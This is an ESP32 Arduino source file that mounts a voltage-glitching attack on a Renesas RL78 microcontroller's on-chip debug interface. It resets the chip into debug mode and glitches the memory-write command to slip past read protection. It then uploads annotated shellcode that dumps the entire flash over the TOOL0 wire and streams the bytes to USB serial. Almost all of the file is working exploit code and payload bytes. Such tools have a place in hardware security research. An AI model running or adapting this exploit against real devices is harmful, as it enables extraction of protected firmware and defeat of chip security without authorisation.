#include <Arduino.h>

#include "driver/uart.h"



#define reset_pin       GPIO_NUM_25
#define glitch_pin      GPIO_NUM_26

#define rl78_rx_pin     GPIO_NUM_32
#define rl78_tx_pin     GPIO_NUM_33


#define OCD_VERSION_CMD 0x90
#define OCD_CONNECT_CMD 0x91
#define OCD_READ_CMD    0x92
#define OCD_WRITE_CMD   0x93
#define OCD_EXEC_CMD    0x94

#define BAUD_SET_CMD    0x9a

#define SOH             1
#define STX             2
#define ETX             3

#define ACK             6

/*
SFR2:000F07E0 loc_F07E0:     // shellcode for dumping full flash contents 0x0-0xfffff                       
SFR2:000F07E0                                       
SFR2:000F07E0                 mov     es, #0    // clear registers for memory addressing
SFR2:000F07E2                 movw    de, #0
SFR2:000F07E5                 nop
SFR2:000F07E6 loc_F07E6:                            
SFR2:000F07E6                 mov     a, es:[de]  // index memory 1 byte at a time and move to accumulator
SFR2:000F07E8                 call    sub_EFFA1   // call tool_tx to send byte in reg A over tool0 wire
SFR2:000F07EC                 incw    de      // increment de till full 0xffff wraps to 0
SFR2:000F07ED                 movw    ax, de
SFR2:000F07EE                 cmpw    ax, #0    
SFR2:000F07F1                 bnz     loc_F07E6   // if de hasnt wrapped keep dumping
SFR2:000F07F3                 br      loc_F07F9     // if it has, go to es inc routine
SFR2:000F07F5                 0x55          // overwrites ocd flag!
SFR2:000F07F7                 nop                   
SFR2:000F07F8                 nop
SFR2:000F07F9                 mov     a, es     
SFR2:000F07FB                 inc     a
SFR2:000F07FC                 and     a, #0Fh   // if es is addressing 0xfxxxx we are at last addressable region
SFR2:000F07FE                 mov     es, a     // set es with incremented range
BRAM:000F0800                 set1    byte_F0090.0  // enabled access to data flash, just setting everytime as its easier to fit in asm
BRAM:000F0804                 br      loc_F07E6   // branch to 0xffff dump routine
*/

uint8_t shellcode[] = {
  0xe0, 0x07, 0x26, // 0xF07E0 location, 0x26 length of packet  
  0x41, 0x00, 0x34, 0x00, 0x00, 0x00, 0x11, 0x89, 0xFC, 0xA1, 0xFF, 0x0E, 0xA5, 0x15, 0x44,
  0x00, 0x00, 0xDF, 0xF3, 0xEF, 0x04, 0x55, 0x00, 0x00, 0x00, 0x8E, 0xFD, 0x81, 0x5C, 0x0F,
  0x9E, 0xFD, 0x71, 0x00, 0x90, 0x00, 0xEF, 0xE0
};



bool glitchworked = false;

/*
  Serial0: RX0 on GPIO3, TX0 on GPIO1
  Serial1: RX1 on GPIO9, TX1 on GPIO10 (+CTS1 and RTS1)
  Serial2: RX2 on GPIO16, TX2 on GPIO17 (+CTS2 and RTS2)
*/

volatile uint32_t* txReg = portOutputRegister(digitalPinToPort(glitch_pin));
uint32_t txBitMask = digitalPinToBitMask(glitch_pin);


void enableGlitch(bool on){

  if(!on){
      *txReg = *txReg | txBitMask; 
  }else{
    *txReg = *txReg & ~txBitMask;    
  }  
}

void setup(void) 
{
  Serial.begin(460800);   // USB uart
    
  // Set up pins
  pinMode(reset_pin, OUTPUT);
  pinMode(glitch_pin, OUTPUT);

 
  // Set initial pin states
  digitalWrite(reset_pin, HIGH);  
  digitalWrite(glitch_pin, LOW); 
  enableGlitch(true);       
}


static inline uint8_t tool78_calc_ocd_checksum8(size_t len, const uint8_t* data) {
	//return /*~*/(tool78_calc_checksum8(len, data)/*+1*/)&0xff;
	uint8_t r = 0;
	for (size_t i = 0; i < len; ++i) r = r + data[i];
	r = (r - 1) & 0xff;
	// if corrupt checksum:
	//	r = (r + 1) & 0xff;
	return r;
}



static inline int readBytes(uint8_t * buffer, int buffersize, int expected, int timeout_us){
    int count = 0;
    auto start = micros();
    do {
        if(buffersize<count+1)break;

        if(Serial1.available()){
          buffer[count++] = Serial1.read();
          start = micros();
        }else{
          optimistic_yield(1000UL);
        }        
    } while (micros() - start < timeout_us && count < expected);
    return count;
}

static inline void readResponse(int timeout_us, bool silent = false){
    uint8_t rxbuffer[100];
    int rxlen = readBytes(rxbuffer,100,100,timeout_us);
    if(rxlen==0){
      Serial.println("no data");
      return;  
    }

    if(silent){
      return;
    }
    Serial.print("Data: ");
    for (size_t i = 0; i < rxlen; i++)
    {
      uint8_t n= rxbuffer[i];
      if(n<16) Serial.print("0");
      Serial.print(n,HEX);
      Serial.print(" ");
    }
  
    Serial.println();
}


#define HALT while(true){sleep(100);}


/*
  gpara.offset_us_min = 10;
	gpara.offset_us_max = 35433 - 1000;

	gpara.length_us_min = 0;
	gpara.length_us_max = 60;
*/

void loop(){
    uint8_t rxbuffer[100];   
    Serial1.begin(115200,SERIAL_8N1,rl78_rx_pin, rl78_tx_pin);  // TOOL0 uart 
    while(true){      
        int rxlen = 0;

        //Serial1.flush();/        
        Serial1.end();

        pinMode(rl78_rx_pin,INPUT);
        pinMode(rl78_tx_pin,OUTPUT);        
        digitalWrite(rl78_tx_pin, LOW);        
        digitalWrite(reset_pin, LOW);      
        delayMicroseconds(1800);    

        // Reset High, Tool0 Low
        digitalWrite(reset_pin, HIGH);  // Start chip with TOOL0 low to enter OCD mode
        delay(1);                       // 2ms, fail0verflow 1ms
      
        // Reset High, Tool0 High
        Serial1.begin(115200,SERIAL_8N1,rl78_rx_pin, rl78_tx_pin);  // TOOL0 uart   
        delay(1);                        
        while(Serial1.available()){
            Serial1.read();
        }

        // enter ocd mode        
        Serial1.write(0xc5);          // Debugger init cmd
        delay(1);

        // Send Init Baud CMD frame 
        Serial1.write(SOH);   
        Serial1.write(0x03);          // Length
        Serial1.write(BAUD_SET_CMD);  
        Serial1.write((uint8_t)0x00);          // 115200 baud rate
        //Serial1.write(0x22);          // Voltage * 10 = 0x180 or 240(2.4v), 0x14        
        //Serial1.write(0x41);          // Checksum(length byte + data bytes = (~(sum) + 1)&0xff = chksum  

        Serial1.write(0x14);          // Voltage * 10 = 0x180 or 240(2.4v), 0x14        
        Serial1.write(0x4f);          // Checksum(length byte + data bytes = (~(sum) + 1)&0xff = chksum          
        Serial1.write(ETX);  

        delay(1); 
        readBytes(rxbuffer,sizeof(rxbuffer), 8,1000); // kill echo

        // read Response
        //<< C5 01 03 9A 00 22 41 03 
        //>> 02 03 06 10 00 E7 03 00 
        // read Init Baud CMD response + sync byte 0x00
        rxlen = readBytes(rxbuffer,sizeof(rxbuffer), 8,1000);
        if(rxlen !=8 || rxbuffer[0] != 0x02){
         
            Serial.print("Error BAUD_SET_CMD, HALT!");
            Serial.print(rxlen);
            Serial.print("  ");
            Serial.print(rxbuffer[0],HEX);
            //HALT;  
            Serial1.end();
            digitalWrite(reset_pin, LOW);     
            delay(10);            
            digitalWrite(reset_pin, HIGH);  // Start chip with TOOL0 low to enter OCD mode                 
            delay(2);             
            continue;
        }   

/*
        // unlock chip, needs oid id
        uint8_t ocdid[11]={0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,0x12,0x34,0};   
        ocdid[10] = tool78_calc_ocd_checksum8(10,ocdid);
        Serial1.write(OCD_CONNECT_CMD); 
        readBytes(rxbuffer,sizeof(rxbuffer), 1,1000);                    
        for (size_t i = 0; i < 11; i++)
        {          
          Serial1.write(ocdid[i]);                  
        }                
*/        

/*
        Serial1.write(OCD_VERSION_CMD);        
        delay(10);

        Serial1.write(0x00);  // Reset
        delay(10);        
*/        
        uint32_t glitch_offset_us = 0;
        uint32_t glitch_length_us  = 0;

        int maxcount = 1000;
        while(maxcount>0){
            maxcount--;

            glitch_offset_us = 60 + random() % 100;     // 60 - 160
            glitch_length_us = 20 + (random() % 15);    // 20 - 35    


            // write to ram
            Serial1.write(OCD_WRITE_CMD);

            // random glitch
            delayMicroseconds(glitch_offset_us);
            enableGlitch(false);
            delayMicroseconds(glitch_length_us);
            enableGlitch(true);
                
            // read response
            //delay(1);            
            rxlen = readBytes(rxbuffer,sizeof(rxbuffer),2,1000);

            // if response is 00, write ram failed, retry..
            if(rxlen==2 && rxbuffer[1] == 0){                
                continue;                      
            }
            
            // maybe success?
            if(rxlen==1){
              break;
            }              
        }  

        if(maxcount == 0){
          // reset device and restart
          Serial.print("X");
          continue;
        }      

        // Write shellcode to OCD rom entry for 94 cmd
        for(int s = 0; s < sizeof(shellcode); s++)
        {          
          Serial1.write(shellcode[s]);        
          delayMicroseconds(10); // notwendig? ehr nicht  
        }

        delay(5);              
        rxlen = readBytes(rxbuffer,sizeof(rxbuffer),sizeof(rxbuffer),3000);

        // Trigger execution of the written payload at 0xF07E0
        Serial1.write(OCD_EXEC_CMD);

        delay(5);

        // lese 5 Bytes, wenn nicht, neuer Glitchversuch mit Reset
        rxlen = readBytes(rxbuffer,sizeof(rxbuffer),7,7000);
        if(rxlen<7){
          // invalid response, retry
          Serial.print("*");
          continue;
        }

        Serial.println();        
        Serial.print("S:");
        Serial.print(rxbuffer[0],HEX);
        Serial.print(":o:");
        Serial.print(glitch_offset_us);
        Serial.print(":l:");
        Serial.println(glitch_length_us);                

        uint8_t me = rxbuffer[1];
        if(rxbuffer[2] == me 
            && rxbuffer[3] == me 
            && rxbuffer[4] == me 
            && rxbuffer[5] == me 
            && rxbuffer[6] == me){
          Serial.print("+");
          continue;
        }
        
        for (size_t i = 0; i < rxlen; i++)
        {
          Serial.write(rxbuffer[i]);
        }
  
        // Serial.println("Start UART Redirector");
        while(true)
        {         
          rxlen = readBytes(rxbuffer,sizeof(rxbuffer),1,15000);
          if(rxlen == 0){
            break;
          }
          Serial.write(rxbuffer[0]);

        }

        continue;
    }
}
